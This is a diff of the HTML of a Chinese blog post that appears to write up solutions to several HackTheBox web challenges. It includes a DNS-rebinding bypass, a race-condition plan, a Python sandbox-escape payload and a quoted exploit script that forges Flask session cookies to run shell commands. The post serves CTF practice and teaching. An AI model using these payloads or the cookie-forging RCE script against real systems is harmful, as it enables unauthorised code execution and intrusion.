@@ -293,21 +293,21 @@
                 <p>HackTheBox之Web部分刷题记录</p>
 <span id="more"></span>
 <h1 id="Let’s-GO"><a href="#Let’s-GO" class="headerlink" title="Let’s GO!"></a>Let’s GO!</h1><h2 id="HackTheBox-AbuseHumanDB"><a href="#HackTheBox-AbuseHumanDB" class="headerlink" title="HackTheBox-AbuseHumanDB"></a>HackTheBox-AbuseHumanDB</h2><h3 id="0x01-初识靶场"><a href="#0x01-初识靶场" class="headerlink" title="0x01 初识靶场"></a>0x01 初识靶场</h3><p>靶场界面如图所示</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/AbuseHumanDB.png" class>
 
 <p>界面中让我们提交，存在虐待性质的网站，我这里直接输入 <code>http://baidu.com</code> 试一试。</p>
 <p>一长串读条之后，出来了界面</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/BaiduInput.png" class>
 
 <p>不太懂，看一下源码吧。</p>
 <h3 id="0x02-代码审计"><a href="#0x02-代码审计" class="headerlink" title="0x02 代码审计"></a>0x02 代码审计</h3><p>先打开路由中的 index.js，粗略看了一眼，全是 Return 错误的，或者是 403 的 …………</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/RouteIndexJS.png" class>
 
 <p>看到了 &#x2F;entries 的接口，会返回给我们前端的界面，访问一下 &#x2F;entries 的接口试试，看看会不会有什么意外的发现。</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/EntriesLike.png" class>
 
 <p>或许是 SQL 注入？尝试一下，分别尝试数字型注入与字符型注入</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/TryingSQLInjection.png" class>
 
 <p>失败了，再回去看看源码</p>
 <p>在 database.js 里，进行了预编译，防止了 SQL 注入。</p>
@@ -317,65 +317,65 @@
 <h3 id="0x02-初识靶场"><a href="#0x02-初识靶场" class="headerlink" title="0x02 初识靶场"></a>0x02 初识靶场</h3><ul>
 <li>靶场界面如图所示</li>
 </ul>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/babyCachedView.png" class>
 
 <p>这里输入一个网站之后挺奇怪的，例如这里我输入 <code>https://google.com</code>，页面会一直加载，也不跳出 Google.com 的东西。如果用 Burpsuite 发包的话一开始 500 的状态码。</p>
 <ul>
 <li>后续页面出来了，如图所示</li>
 </ul>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/GoogleSerlize.png" class>
 
 <p>点击 google.com 的超链接，可以跳转到 google.com，全无思路 ……</p>
 <h3 id="0x03-源码阅读，代码审计"><a href="#0x03-源码阅读，代码审计" class="headerlink" title="0x03 源码阅读，代码审计"></a>0x03 源码阅读，代码审计</h3><p>一般拿到源码，都是先看路由，也就是看 route.py，如果在 Java 当中，路由一般都是 xxxController 类似的文件。</p>
 <p>routes.py 文件夹中，第 18 - 21 行，是关于 flag 的，那我们这里直接访问 &#x2F;flag 的路由试一试。</p>
 <p>可惜 403，被 Forbidden 了。</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/FlagRoute.png" class>
 
 <p>回去看源代码，这里还有一句关于 flag 的。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@web.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@is_from_localhost</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line"> <span class="keyword">return</span> send_file(<span class="string">&#x27;flag.png&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
 <p>点进 <code>@is_from_localhost</code> 这个函数，查看一下到底是什么情况。</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/JudgeLocalhostCode.png" class>
 
 <p>很简单，判断客户端的 IP 是不是等于 127.0.0.1，以及 Referer 的 IP 是否等于 127.0.0.1；若相等，则返回成功，若不相等，则返回 403</p>
 <h3 id="0x04-解题"><a href="#0x04-解题" class="headerlink" title="0x04 解题"></a>0x04 解题</h3><ul>
 <li>如果我本机直接起这个服务，肯定是能够得到 flag，但我希望不要以这种方式解出来，于是尝试伪造 Referer</li>
 </ul>
 <p>伪造了 Referer 和 remote_addr 无果，还是决定本地起这个服务。</p>
-<p>教程可参考 <a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/galaxy3000/article/details/122956671" >HackTheBox-baby CachedView_galaxy3000的博客-CSDN博客<i class="fas fa-external-link-alt"></i></a><br>我自己没有做出来这种方法的，于是换了一种 DNS 重绑的做法。</p>
+<p>教程可参考 <a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/galaxy3000/article/details/122956671">HackTheBox-baby CachedView_galaxy3000的博客-CSDN博客<i class="fas fa-external-link-alt"></i></a><br>我自己没有做出来这种方法的，于是换了一种 DNS 重绑的做法。</p>
 <ul>
 <li>DNS 重绑，我个人感觉有点中间人攻击的样子，因为 IP 被重绑之后绕过了。原理图如下</li>
 </ul>
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/DnsRebinding.png" class>
 
-
-<p>工具网站如下<br><a class="link"   target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html" >https://lock.cmpxchg8b.com/rebinder.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>工具网站如下<br><a class="link" target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html<i class="fas fa-external-link-alt"></i></a></p>
 <p>接着，我们输入题目对应的 IP 与 127.0.0.1 在框内</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Rebinding.png" class>
 
 <p>再在题目的界面访问 <code>http://b280a398.7f000001.rbndr.us/flag</code></p>
 <p>多刷几次，就能够看到 flag 的截图了，这里一定要耐心！</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/baby_CachedView_Flag.png" class>
 
 <p>Flag：HTB{reb1nd1ng_y0ur_dns_r3s0lv3r_0n3_qu3ry_4t_4_t1m3}</p>
 <h2 id="HackTheBox-Diogenes’-Rage"><a href="#HackTheBox-Diogenes’-Rage" class="headerlink" title="HackTheBox-Diogenes’ Rage"></a>HackTheBox-Diogenes’ Rage</h2><h3 id="0x01-前言-1"><a href="#0x01-前言-1" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><ul>
 <li>搞开发真累 ………………</li>
 </ul>
 <h3 id="0x02-初识靶场-1"><a href="#0x02-初识靶场-1" class="headerlink" title="0x02 初识靶场"></a>0x02 初识靶场</h3><p>打开靶场后如图所示</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/DiogenesRageIndex.png" class>
 
 <p>下面有一张 1 dollar 的纸币，投进去之后可以点餐，简而言之这是一个自助贩卖机。</p>
 <p>抓包之后看了，感觉没有什么明显的逻辑漏洞，看源码。</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/SeeResponse.png" class>
 
 <h3 id="0x03-代码审计"><a href="#0x03-代码审计" class="headerlink" title="0x03 代码审计"></a>0x03 代码审计</h3><ul>
 <li>还是老样子，先看路由</li>
 </ul>
 <p>路由的第 23 - 44 行出现了 flag</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/FlagJudge.png" class>
 
 <p>前提条件是我们在自助贩卖机下输入的商品号是 C8，可是 C8 的价格是 13 多 dollar。再看看其他的代码，寻找思路。感觉有两种思路</p>
 <h4 id="思路一、修改-apply-进去的数，使得钱够付"><a href="#思路一、修改-apply-进去的数，使得钱够付" class="headerlink" title="思路一、修改 apply 进去的数，使得钱够付"></a>思路一、修改 apply 进去的数，使得钱够付</h4><p>尝试了连续发包，但 JWT 始终会变，username 也一直在变，不太好搞；在投入纸币的时候账户上会多一块钱。而我们在同一时间发起多个请求，就可以把优惠券的价格猛地飙上来，从而凑够购买 C8 的资金</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/JWTDiff.png" class>
 
 <h4 id="思路二、修改货物的价格"><a href="#思路二、修改货物的价格" class="headerlink" title="思路二、修改货物的价格"></a>思路二、修改货物的价格</h4><p>货物没有价格，只有对应的 item，item 对应的是 SQL 语句，SQL 语句是预编译写的，不存在 SQL 注入</p>
 <blockquote>
@@ -388,7 +388,7 @@
 <li>同时在多个进程中运行 &#x2F;api&#x2F;coupons&#x2F;apply。</li>
 <li>使用 &#x2F;api&#x2F;purchase 购买 C8。如果购买成功，则 cat flag</li>
 </ol>
-<p>这里还有一个原因是利用了竞争条件，也就是 Race Condition，竞争条件不再展开，可以移步至我博客<a class="link"   target="_blank" rel="noopener" href="https://withd-raw.github.io/2022/01/29/PortSwigger-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#toc-heading-11" >PortSwigger-文件上传 | 芜风<i class="fas fa-external-link-alt"></i></a></p>
+<p>这里还有一个原因是利用了竞争条件，也就是 Race Condition，竞争条件不再展开，可以移步至我博客<a class="link" target="_blank" rel="noopener" href="https://withd-raw.github.io/2022/01/29/PortSwigger-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#toc-heading-11">PortSwigger-文件上传 | 芜风<i class="fas fa-external-link-alt"></i></a></p>
 <p>1.购买商品时，Cookie 可以通过注册用户发出。<br>2. 优惠券发放时出现争用情况。</p>
 <p>为什么 <strong>#1</strong> 很重要，因为如果我们在没有用户会话的情况下执行 <strong>#2</strong>，则可以调用 registerUser 功能并每次在新会话中颁发优惠券，因此我们无法将优惠券复制到一个帐户。<br>因此，需要先运行 Buy Stuff API 来获取用户会话。</p>
 <h4 id="写-exp"><a href="#写-exp" class="headerlink" title="写 exp"></a>写 exp</h4><p>最开始我写的 exp，太菜了hh</p>
@@ -403,7 +403,7 @@
 <h3 id="0x02-初识靶场-2"><a href="#0x02-初识靶场-2" class="headerlink" title="0x02 初识靶场"></a>0x02 初识靶场</h3><ul>
 <li>靶场界面如图所示</li>
 </ul>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/EasterBunny.png" class>
 
 <p>靶场主要分三个模块：</p>
 <ol>
@@ -412,27 +412,27 @@
 <li>查看其他信件模块。</li>
 </ol>
 <p>简单抓包了一下，在信中写了 XSS 的 Payload</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/XSS.png" class>
 
 <p>当我们点击到 Letter #3 的时候出现了不一样的东西。</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/StrangeLetter.png" class>
 
 <p>没有什么用处，再全部抓了遍包，没有发现什么明显的攻击点，进行代码审计的环节 ~</p>
 <h3 id="0x03-代码审计-1"><a href="#0x03-代码审计-1" class="headerlink" title="0x03 代码审计"></a>0x03 代码审计</h3><ul>
 <li>老样子，先看路由</li>
 </ul>
 <p>看了一圈，没有明显看到与 Flag 有关的东西，但是找到一处可疑的地方，第 47 - 62 行。</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/StrangeFound.png" class>
 
 <p>这里通过 Auth 就能够获取到 Flag 了吧，可是根据路由的第一行我们需要跳转到 <code>/utils/authorisation</code> 去看。</p>
 <p><strong>路由第一行</strong></p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; isAdmin, authSecret &#125; = <span class="built_in">require</span>(<span class="string">&quot;../utils/authorisation&quot;</span>);</span><br></pre></td></tr></table></figure>
 
 <p><strong>authorisation.js</strong></p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/AuthJSCode.png" class>
 <p>好吧，这里的 <code>authSecret</code> 是随机生成的，如果要使得 req.cookie 与 <code>authSecret</code> 相等是不太可能。但是这里要求我们以 127.0.0.1 进行身份认证，SSRF(?)。不清楚，去看看 <code>database.js</code></p>
 <p><strong>database.js</strong></p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/DatabaseCode.png" class>
 
 <p>数据库当中，message &#x3D; 3 的地方存在 Flag，我们接下来的思路便是成功身份认证了。</p>
 <p>SQL 语句预编译了，无法进行 SQL 注入了。</p>
@@ -442,7 +442,7 @@
 
 <p>讲道理，有点丑，不是很舒服，每一次刷新界面，都会出现一个随机数。</p>
 <p>查看一下源码，发现有一段注解 “&#x2F;debug”，尝试访问 &#x2F;debug 接口；发现是题目的源代码。</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/interdimensionalinternetIndexCode2.png" class>
 
 <h3 id="0x03-代码审计-2"><a href="#0x03-代码审计-2" class="headerlink" title="0x03 代码审计"></a>0x03 代码审计</h3><ul>
 <li>粗略审计一遍源码，发现并没有 flag 的字样，判断获取 flag 的手段为 <code>cat flag</code>，我们下一步去寻找一下存在命令执行的地方。</li>
@@ -450,23 +450,23 @@
 <blockquote>
 <p>命令执行部分的代码</p>
 </blockquote>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/OSCommandExec.png" class>
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">recipe</span>):</span><br><span class="line"> <span class="keyword">global</span> garage</span><br><span class="line"> builtins, garage = &#123;<span class="string">&#x27;__builtins__&#x27;</span>: <span class="literal">None</span>&#125;, &#123;&#125;</span><br><span class="line"> <span class="keyword">try</span>: <span class="built_in">exec</span>(recipe, builtins, garage)</span><br><span class="line"> <span class="keyword">except</span>: <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
 
 <p><code>__builtins__</code> 这个函数用来内建对象，这里并不影响代码审计，关键问题在 recipe 上面。recipe 是传进来用于命令执行的语句。深入分析</p>
 <p>处理 recipe 的代码如下，太长了，先不贴，用图片来说明。</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/RecipeCode.png" class>
 
 <ul>
 <li>第 16 - 19 行</li>
 </ul>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ingredientANDmeasurements.png" class>
 <p>获取 <code>session</code> 的 <code>ingredient</code> 和 <code>measurements</code>，用他们拼接 <code>recipe</code> 变量。</p>
 <ul>
 <li>第 20 行之后的判断语句</li>
 </ul>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/RecipeMoreThan20.png" class>
 
 <p>若 <code>session</code> 的 <code>ingredient</code> 和 <code>measurements</code> 存在，并且 <code>recipe</code> 的长度 &gt; 20 ；就进入正则，判断传进来的 recipe 里面含不含有一堆字符，含的话直接拦截并返回。</p>
 <p>若并没有达到条件，则会产生随机值并返回。所以核心在于 payload 的构造 ———— 如何绕过正则的匹配。</p>
@@ -478,7 +478,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    recipe = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b = &quot;builtins = \\x5bi for i in \\x28)\\x2e\\x5f\\x5fclass\\x5f\\x5f\\x2e\\x5f\\x5fbases\\x5f\\x5f\\x5b0]\\x2e\\x5f\\x5fsubclasses\\x5f\\x5f\\x28) if i\\x2e\\x5f\\x5fname\\x5f\\x5f==&#x27;catch\\x5fwarnings&#x27;]\\x5b0]\\x28)\\x2e\\x5fmodule\\x2e\\x5f\\x5fbuiltins\\x5f\\x5f&quot;</span></span><br><span class="line"><span class="string">exec b</span></span><br><span class="line"><span class="string">print builtins</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">r&#x27;\[|\(_\.&#x27;</span>, recipe):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;invalid payload&#x27;</span></span><br><span class="line">    calc(recipe)</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li>编写 exp，借用外国师傅的 <a class="link"   target="_blank" rel="noopener" href="https://github.com/d4rk007/ctfs/blob/main/Interdimensional-Internet/exploit.py" >exp.py<i class="fas fa-external-link-alt"></i></a></li>
+<li>编写 exp，借用外国师傅的 <a class="link" target="_blank" rel="noopener" href="https://github.com/d4rk007/ctfs/blob/main/Interdimensional-Internet/exploit.py">exp.py<i class="fas fa-external-link-alt"></i></a></li>
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> URLSafeTimedSerializer</span><br><span class="line"></span><br><span class="line">TARGET = <span class="string">&#x27;http://&lt;IP&gt;:&lt;PORT&gt;/&#x27;</span></span><br><span class="line"></span><br><span class="line">SECRET_KEY = <span class="string">&#x27;&lt;SECRET_KEY&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PAYLOAD = u&quot;&quot;&quot;i=().__class__.__base__.__subclasses__()[59]()._module.__builtins__[&#x27;__import__&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># i(&#x27;flask&#x27;).session[&#x27;x&#x27;]=i(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">PAYLOAD = <span class="string">u&quot;&quot;&quot;i=().__class__.__base__.__subclasses__()[59]()._module.__builtins__[&#x27;__import__&#x27;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">i(&#x27;flask&#x27;).session[&#x27;x&#x27;]=i(&#x27;os&#x27;).popen(&#x27;cat t*&#x27;).read()&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">flask_encoding</span>:</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">scsi = SecureCookieSessionInterface()</span><br><span class="line"></span><br><span class="line">signer_kwargs = <span class="built_in">dict</span>(</span><br><span class="line"></span><br><span class="line">key_derivation=scsi.key_derivation,</span><br><span class="line"></span><br><span class="line">digest_method=scsi.digest_method</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">self.serializer = URLSafeTimedSerializer(SECRET_KEY, salt=scsi.salt,</span><br><span class="line"></span><br><span class="line">serializer=scsi.serializer,</span><br><span class="line"></span><br><span class="line">signer_kwargs=signer_kwargs</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deserialize</span>(<span class="params">self, cookie_str</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> self.serializer.loads(cookie_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">serialize</span>(<span class="params">self, cookie_dict</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> self.serializer.dumps(cookie_dict)</span><br><span class="line"></span><br><span class="line"><span class="comment"># waf bypass encoding</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_payload</span>(<span class="params">payload</span>):</span><br><span class="line"></span><br><span class="line">payload = <span class="string">u&#x27;&quot;a&quot;\nexec &quot;&quot;&quot;&#x27;</span> + payload + <span class="string">u&#x27;&quot;&quot;&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line">blacklist = &#123;</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;[&#x27;</span>: <span class="string">&#x27;\\x5b&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;(&#x27;</span>: <span class="string">&#x27;\\x28&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;_&#x27;</span>: <span class="string">&#x27;\\x5f&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;.&#x27;</span>: <span class="string">&#x27;\\x2e&#x27;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c,h <span class="keyword">in</span> blacklist.items():</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> c <span class="keyword">in</span> payload:</span><br><span class="line"></span><br><span class="line">payload = payload.replace(c, h)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modify_cookie</span>(<span class="params">s</span>):</span><br><span class="line"></span><br><span class="line">f = flask_encoding()</span><br><span class="line"></span><br><span class="line">cookie_dict = f.deserialize(s.cookies[<span class="string">&#x27;session&#x27;</span>])</span><br><span class="line"></span><br><span class="line">cookie_dict[<span class="string">&#x27;ingredient&#x27;</span>] = <span class="string">u&#x27;i&#x27;</span></span><br><span class="line"></span><br><span class="line">cookie_dict[<span class="string">&#x27;measurements&#x27;</span>] = encode_payload(PAYLOAD)</span><br><span class="line"></span><br><span class="line">s.cookies[<span class="string">&#x27;session&#x27;</span>] = f.serialize(cookie_dict)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> s, f</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec_rce</span>(<span class="params">s, f</span>):</span><br><span class="line"></span><br><span class="line">r = s.get(TARGET)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">enc_exfil_data = r.cookies[<span class="string">&#x27;session&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> KeyError:</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Exploit failed, session cookie not found!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> f.deserialize(enc_exfil_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">s.get(TARGET)</span><br><span class="line"></span><br><span class="line">s, f = modify_cookie(s)</span><br><span class="line"></span><br><span class="line">exfil_data = exec_rce(s, f)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(exfil_data[<span class="string">&#x27;x&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
 
@@ -486,13 +486,13 @@
 <h2 id="HackTheBox-LoveTok"><a href="#HackTheBox-LoveTok" class="headerlink" title="HackTheBox-LoveTok"></a>HackTheBox-LoveTok</h2><h3 id="0x01-简单分析靶场"><a href="#0x01-简单分析靶场" class="headerlink" title="0x01 简单分析靶场"></a>0x01 简单分析靶场</h3><ul>
 <li>靶场界面如图所示</li>
 </ul>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Index.png" class>
 
 <p>f12 一下发现一串 SHA512 的序列</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha512-qTXRIMyZIFb8iQcfjXWCO8+M5Tbc38Qi5WzdPOYZHIlZpzBHG3L3by84BBBOiRGiEb7KKtAOAs5qYdUiZiQNNQ==</span><br></pre></td></tr></table></figure>
 <p>先放着吧，说不定到时候就用到了。</p>
 <p>提示语也挺…… 嗯…… crazy 的。</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/hint.png" class>
 
 <p>点击下面的按钮，生成了 Find Love 的时间，没什么用，再去扫一下目录吧。</p>
 <ul>
@@ -522,24 +522,24 @@
 <p>我们先编写 poc，在这一 poc 中，直接就执行 phpinfo 的命令了</p>
